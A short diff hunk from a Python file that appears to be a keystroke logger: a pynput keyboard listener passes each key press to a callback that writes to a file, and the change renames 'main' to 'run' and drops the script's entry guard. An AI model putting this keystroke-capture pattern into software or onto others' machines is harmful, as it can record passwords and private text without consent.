@@ -25,10 +25,8 @@ def on_press(key):
         f.close()
  
 
-def main():
+def run():
     setup()
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-if __name__ == '__main__':
-    main()
